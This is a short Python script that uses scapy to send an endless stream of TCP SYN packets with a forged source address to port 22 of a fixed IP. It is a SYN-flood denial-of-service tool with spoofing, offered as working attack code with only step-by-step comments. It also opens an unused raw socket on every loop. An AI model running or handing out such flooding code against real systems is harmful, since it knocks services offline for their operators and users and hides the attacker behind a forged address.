import socket
from scapy.all import IP, TCP, send

# Set the target IP and port
target = "192.168.2.1"
port = 22

# While loop to continuously send SYN packets
while True:
    try:
        # Create a raw socket and set the IP header fields
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # Craft the IP header with a fake source IP
        fake_ip = "182.21.20.32"
        ip_packet = IP(src=fake_ip, dst=target)

        # Craft the TCP SYN packet
        syn_packet = TCP(sport=12345, dport=port, flags="S", seq=12345)

        # Send the SYN packet
        send(ip_packet/syn_packet)

    except KeyboardInterrupt:
        break

    except socket.error:
        print("Socket error occurred. Check privileges or run with admin/root access.")
        break
